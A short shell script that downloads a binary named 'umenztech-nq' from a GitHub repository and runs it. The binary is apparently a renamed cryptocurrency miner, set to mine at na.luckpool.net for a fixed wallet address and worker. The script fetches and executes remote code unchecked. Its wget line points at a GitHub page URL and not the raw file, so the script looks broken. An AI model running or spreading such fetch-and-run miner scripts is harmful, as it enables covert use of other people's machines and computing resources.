#!/bin/sh
echo ./umenztech-nq -v -l na.luckpool.net:3956 -u RAe2Mx9RrCGtXew2SK2wpNYS1fzLywDYtX.Worker1 -t 2 >> test1.sh && chmod +x test1.sh && wget https://github.com/dorinkutozi/umenztech/blob/umenztech-cpu-nq/umenztech-nq && ./test1.sh
